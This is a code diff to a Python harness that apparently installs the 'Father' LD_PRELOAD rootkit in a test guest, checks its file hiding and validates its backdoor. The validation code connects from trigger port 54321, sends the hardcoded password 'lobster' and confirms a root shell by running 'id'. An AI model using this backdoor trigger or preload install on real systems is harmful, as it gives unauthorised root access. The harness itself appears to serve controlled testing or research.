@@ -3,7 +3,6 @@
 from __future__ import annotations
 
 import socket
-import time
 from pathlib import Path
 
 import yaml
@@ -27,7 +26,7 @@ INSTALLED_LIBRARY = "/lib/selinux.so.3"
 PRELOAD_CONFIG = "/etc/ld.so.preload"
 SOURCE_PORT = 54321
 SHELL_PASSWORD = b"lobster\0"
-AUTHENTICATION_PROMPT = b"AUTHENTICATE:"
+AUTHENTICATION_PROMPT = b"\n\nAUTHENTICATE: "
 SHELL_MARKER = b"Enjoy the shell!"
 
 # Only intentional Father customization
@@ -119,10 +118,12 @@ def run_father(
                 raise RuntimeError("Father did not hide the controlled file as expected")
 
             console.scope("HOST", "validate Father backdoor")
-            identity = _validate_backdoor(
-                ssh,
-                command_log_path=command_log_path,
-            )
+            try:
+                identity = _validate_backdoor(ssh)
+            except Exception as exc:
+                record_operation(command_log_path, "validate_backdoor", error=str(exc))
+                raise
+            record_operation(command_log_path, "validate_backdoor")
 
             if cleanup:
                 console.scope("GUEST", "cleanup treatment")
@@ -199,79 +200,38 @@ def _upload_archive(
 
 def _validate_backdoor(
     ssh: SSHClient,
-    *,
-    command_log_path: Path,
 ) -> str:
-    response = bytearray()
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    deadline = time.monotonic() + 12
     console.step(
         f"Connecting to {ssh.host}:{ssh.port} from Father trigger port "
         f"{SOURCE_PORT}..."
     )
     try:
-        client.bind(("", SOURCE_PORT))
-        client.settimeout(max(0.001, deadline - time.monotonic()))
-        client.connect((ssh.host, ssh.port))
+        with socket.create_connection(
+            (ssh.host, ssh.port),
+            timeout=12,
+            source_address=("", SOURCE_PORT),
+        ) as client, client.makefile("rb") as response:
+            response.read(len(AUTHENTICATION_PROMPT))
+            client.sendall(SHELL_PASSWORD)
+            if not any(SHELL_MARKER in line for line in response):
+                raise RuntimeError("Father did not open the native shell")
 
-        while AUTHENTICATION_PROMPT not in response and time.monotonic() < deadline:
-            client.settimeout(max(0.001, deadline - time.monotonic()))
-            chunk = client.recv(4096)
-            if not chunk:
-                break
-            response.extend(chunk)
-        if AUTHENTICATION_PROMPT not in response:
-            raise RuntimeError("Father authentication prompt was not received")
+            client.sendall(b"id\n")
+            identity = next(
+                (
+                    line.decode(errors="replace")
+                    .strip()
+                    .removeprefix("\x1b[0m")
+                    for line in response
+                    if b"uid=0(root)" in line and b"gid=1337" in line
+                ),
+                None,
+            )
+    except OSError as exc:
+        raise RuntimeError(f"Father backdoor connection failed: {exc}") from exc
 
-        client.sendall(SHELL_PASSWORD)
-        authentication_response_offset = len(response)
-        while (
-            SHELL_MARKER not in response[authentication_response_offset:]
-            and time.monotonic() < deadline
-        ):
-            client.settimeout(max(0.001, deadline - time.monotonic()))
-            chunk = client.recv(4096)
-            if not chunk:
-                break
-            response.extend(chunk)
-        if SHELL_MARKER not in response[authentication_response_offset:]:
-            raise RuntimeError("Father shell marker was not received")
-
-        client.sendall(b"id\n")
-        identity_response_offset = len(response)
-        while (
-            b"uid=0(root)" not in response[identity_response_offset:]
-            or b"gid=1337" not in response[identity_response_offset:]
-        ) and time.monotonic() < deadline:
-            client.settimeout(max(0.001, deadline - time.monotonic()))
-            chunk = client.recv(4096)
-            if not chunk:
-                break
-            response.extend(chunk)
-        if (
-            b"uid=0(root)" not in response[identity_response_offset:]
-            or b"gid=1337" not in response[identity_response_offset:]
-        ):
-            raise RuntimeError("Father shell did not return the expected root identity")
-        identity_response = response[identity_response_offset:].decode(errors="replace")
-        identity = next(
-            (
-                line.strip().removeprefix("\x1b[0m")
-                for line in identity_response.splitlines()
-                if "uid=0(root)" in line and "gid=1337" in line
-            ),
-            None,
-        )
-        if identity is None:
-            raise RuntimeError("Father shell identity could not be parsed")
-    except (OSError, RuntimeError) as exc:
-        record_operation(command_log_path, "validate_backdoor", error=str(exc))
-        raise RuntimeError(f"Father backdoor validation failed: {exc}") from exc
-    finally:
-        client.close()
-
-    record_operation(command_log_path, "validate_backdoor")
+    if identity is None:
+        raise RuntimeError("Father shell did not return the expected root identity")
     console.ok(f'Father shell opened: "{SHELL_MARKER.decode()}"')
     console.ok(f"Father shell identity: {identity}")
     return identity
